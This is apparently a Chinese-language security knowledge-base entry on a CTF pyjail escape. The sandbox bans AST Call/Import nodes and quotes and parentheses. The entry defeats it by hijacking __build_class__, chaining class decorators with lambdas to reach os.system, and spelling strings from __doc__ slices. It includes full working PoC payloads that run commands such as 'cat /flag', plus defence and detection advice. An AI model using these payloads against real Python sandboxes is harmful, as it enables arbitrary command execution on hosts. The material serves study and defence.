---
id: binary-pwn-sandbox-escape-ast-whitelist-no-call-decorator-lambda-docstring
title: AST 白名单禁 Call/Import 的 Python 沙箱：用 class 装饰器 + lambda 造出「无 Call 节点」的调用链，靠 __doc__ 切片拼字符串执行 os.system
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-pyjail-ast-whitelist-no-call-decorator-lambda
aliases:
- AST 沙箱逃逸 禁 Call
- 禁括号 AST 白名单 绕过
- 装饰器代替函数调用
- __build_class__ 劫持 装饰器链
- __doc__ 切片构造字符串
- compile PyCF_ONLY_AST 沙箱
tags:
- python
- pyjail
- sandbox-escape
- ast
- decorator
- lambda
- docstring
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:16:14+08:00'
  notes: 已对照原文核对（BLACK_LIST 四字符、attributes 中 Call/Import/ImportFrom/alias=False、__build_class__ 改写为 lambda 返回 object、@ 装饰器链取 __subclasses__、s[120]=BuiltinImporter load_module os、os.system、__doc__ 下标拼字符串、无回显写 static/ 目录均与原文一致）；本次核对未读取图片，仅依据正文；原文 s[120] 明确指出为 Python 3.12 且随版本变化，未复现
---

## 一句话结论

用 `compile(src, "<input>", "exec", flags=ast.PyCF_ONLY_AST)` + `ast.walk` 做黑名单式 AST 校验（`Call`/`Import`/`ImportFrom`/`alias` 直接判 False）并额外过滤 `' " ( )` 四个字符时，攻击者可以完全不写一次函数调用：先改写 `__builtins__["__build_class__"]` 让 `class` 语句返回 `object`，再用 `@expr` 装饰器在定义时执行，逐层把 `type.__subclasses__`、`BuiltinImporter.load_module`、`os.system` 串起来；被过滤的引号用 `[].__doc__` / `{}.__doc__` 的下标与加号拼出字符串。

## 原理

- **AST 白名单只拦了「显式调用」**：`attributes` 字典给 `Call`/`Import`/`ImportFrom`/`alias` 设为 `False`，`ast.walk` 遇到即拒绝。但装饰器语法 `@expr` 在 AST 里是 `ClassDef.decorator_list`，不是 `Call` 节点——解释器在处理 `class` 语句时才去调用装饰器。于是「调用」发生在 AST 检查之外。
- **`__build_class__` 是可改写的钩子**：执行 `class X: ...` 时 CPython 调用 `globals["__builtins__"]["__build_class__"](...)`。沙箱虽然只给了白名单 builtins（`pow/divmod/min/max/sum/complex/oct/hex`），但这个字典本身可写，把它换成 `lambda *_: [].__class__.__base__` 后，任何 `class` 都返回 `object`——正好给装饰器当参数。
- **装饰器就是无括号调用**：`@f` + `class s: _` 等价 `s = f(对象)`。多层装饰器从下往上依次执行，因此可以用「内层 lambda 返回字符串、外层接收字符串执行」的方式构造出 `load_module("os")`、`os.system("whoami")` 这种两步调用，全程不出现 `(`。
- **lambda 没有 Call 节点**：`lambda _: expr` 只是 `Lambda` 节点（被白名单允许），它的「求值」由装饰器触发，因此绕过 `Call` 禁用。
- **引号被禁则用文档字符串切片**：`[].__doc__`、`{}.__doc__`、`divmod.__doc__` 都是长文本，按版本固定的下标能取出 `o`、`s`、`/`、`f`、`l`、`a`、`g` 等字符，用 `+` 拼成 `"os"`、`"/"`、`"cat /flag > static/a.txt"`。这也是为什么同一 payload 换 Python 版本会失败——下标要按版本校准。
- **最终危害**：`os.system` 在 Web 进程权限下执行命令；无回显时把结果写到可访问的 `static/` 目录（先 `mkdir static`）再从浏览器取回。

## 触发条件

- 沙箱用 AST 黑名单/白名单校验，且只对 `Call`/`Import` 等「明显危险节点」设限，未禁用 `ClassDef`/装饰器/`Lambda`/`Attribute`/`Subscript`。
- 字符层过滤了引号与括号（本例 `BLACK_LIST = ['\'', '"', '(', ')']`），逼迫攻击者换字符串构造方式。
- `exec` 的 globals 中 `__builtins__` 是一个**可写字典**（哪怕是白名单字典）。
- 目标 Python 版本的 `list.__doc__`/`dict.__doc__` 等文档串内容已知（下标偏移随版本变化）。
- 进程有执行系统命令的权限（未降权、未 seccomp 隔离）。

## 利用步骤

1. 确认三层过滤：字符黑名单是否只有 `' " ( )`、AST 是否拦 `Call`/`Import`、globals 里 `__builtins__` 是否是白名单字典且可写。
2. 劫持类创建，让 `class` 返回 `object`：

```python
__builtins__["__build_class__"]=lambda*_:[].__class__.__base__
```

3. 用装饰器取子类列表（等价 `type.__subclasses__(object)`）：

```python
@[].__class__.__base__.__class__.__subclasses__
class s:_
```

4. 加载 `os`：内层 `lambda` 返回字符串 `"os"`，外层 `BuiltinImporter.load_module` 执行加载。索引 `s[120]` 是 `_frozen_importlib.BuiltinImporter`，随 Python 版本不同（本例 3.12 为 120）：

```python
@s[120].load_module
@lambda _:"os"
class o:_
```

5. 执行命令：

```python
@o.system
@lambda _:"whoami"
class _:_
```

6. 引号被禁时改用 `__doc__` 切片拼字符串。`__builtins__` 这个键名本身也要拼（因为它含下划线但没被过滤，其实可直接写；被过滤的是引号，故键名用切片仅为风格需要）：

```python
__builtins__[[].__doc__.__doc__[31]+[].__doc__.__doc__[31]+[].__doc__[13]+[].__doc__[1]+[].__doc__[2]+[].__doc__[3]+[].__doc__[139]+[].__doc__.__doc__[31]+[].__doc__[23]+[].__doc__[3]+[].__doc__[12]+[].__doc__[17]+[].__doc__[17]+[].__doc__.__doc__[31]+[].__doc__.__doc__[31]]=lambda*_:[].__class__.__base__
```

7. 无回显时写静态文件：`os.system("mkdir static")` 与 `os.system("cat /flag > static/a.txt")` 分两次提交，再从 Web 访问 `/static/a.txt`。

## PoC

核心三步（可读版本，`s[120]` 需按版本调）：

```python
__builtins__["__build_class__"] = lambda *_: [].__class__.__base__
@[].__class__.__base__.__class__.__subclasses__
class s: _
@s[120].load_module
@lambda _: "os"
class o: _
@o.system
@lambda _: "id"
class _: _
```

全切片版（引号/括号全禁）：

```python
__builtins__[[].__doc__.__doc__[31]+[].__doc__.__doc__[31]+[].__doc__[13]+[].__doc__[1]+[].__doc__[2]+[].__doc__[3]+[].__doc__[139]+[].__doc__.__doc__[31]+[].__doc__[23]+[].__doc__[3]+[].__doc__[12]+[].__doc__[17]+[].__doc__[17]+[].__doc__.__doc__[31]+[].__doc__.__doc__[31]]=lambda*_:[].__class__.__base__
@[].__class__.__base__.__class__.__subclasses__
class s:_
@s[120].load_module
@lambda _:[].__doc__[32]+[].__doc__[17]
class o:_
@o.system
@lambda _:{}.__doc__[15]+{}.__doc__[104]+{}.__doc__[0]+{}.__doc__[1]+{}.__doc__[28]+{}.__doc__[6]+{}.__doc__[97]+{}.__doc__[3]+{}.__doc__[27]+{}.__doc__[3]+{}.__doc__[1]+{}.__doc__[2]
class _:_
```

辅助脚本（按目标版本找 `BuiltinImporter` 下标、按 `__doc__` 反查字符）：

```python
subs = [].__class__.__base__.__class__.__subclasses__(object)
print([i for i, c in enumerate(subs) if 'BuiltinImporter' in str(c)])
d = [].__doc__
print([(ch, d.find(ch)) for ch in "os/flag"])
```

## 变体与关联

- 变体：`@` 被 AST 拦时，可换其它「定义时求值」语法：默认参数求值（`def f(x=expr)` 里的 `expr` 仍是表达式而非 Call）、`with` 的上下文管理器、注解求值、`except` 匹配。
- 变体：`__build_class__` 被禁时，可用 `[].__class__.__base__.__class__.__subclasses__` 直接取到 `type` 再 `__subclasses__()`——但那需要一次 `Call`，故必须另找装饰器/默认参数通道。
- 变体：字符串构造可换 `str.__doc__`、异常 `.__doc__`、`__name__` 属性（`[].__class__.__name__` = `list`）等，不必依赖 `list.__doc__` 的固定下标。
- 关联：[[binary-pwn-sandbox-escape-buildclass-hijack-decorator-nfkc]]（同样是 `__build_class__` 劫持 + 装饰器链，但那条的入口约束是「字母 `h u i` 被禁 + builtins 被清空」，靠 NFKC 全角标识符过关、字符串用标识符写；本条入口约束是「AST 禁 `Call` + 引号括号被禁 + builtins 是白名单字典而非空字典」，靠装饰器避开 `Call` 节点、字符串全靠 `__doc__` 下标拼接，两者的失败点与 PoC 完全不同）。
- 关联：[[binary-pwn-sandbox-escape-nfkc-ast-name-decorator-cr-bypass]]（AST 层约束的相邻形态：那条是 `Name.id` 回查 + 禁 `(`/`[`/`=`，靠全角标识符与 `\r` 换行；本条不禁 `[` 也不靠 NFKC，而是用 `Subscript` 取文档串字符）。

## 检测与防御

- 防御：AST 校验要按「允许列表」而非「危险节点黑名单」：只放行 `Expression`+字面量/常量与受限 `BoolOp/Compare`，显式拒绝 `ClassDef`、`FunctionDef`、`Lambda`、装饰器列表、`Attribute`、`Subscript`。
- 防御：拒绝任何 `__` 开头的标识符与属性访问，禁止改写 `__builtins__`（传入 `MappingProxyType` 或用受限 `__builtins__` 对象而非 dict）。
- 防御：真正可靠的隔离是独立低权限进程/容器 + seccomp + 只读文件系统；纯 Python 层沙箱只能当「降低误用」，不能当安全边界。
- 检测：提交内容出现 `@` 装饰器链、`__build_class__`、`__subclasses__`、`load_module`、大量 `__doc__[...]` 下标运算、`lambda*_` 等特征；沙箱进程出现 `fork/exec` 与异常出网。
- 响应：隔离进程、检查落地文件（如 `static/` 下新文件）、轮换该服务可访问的凭据。
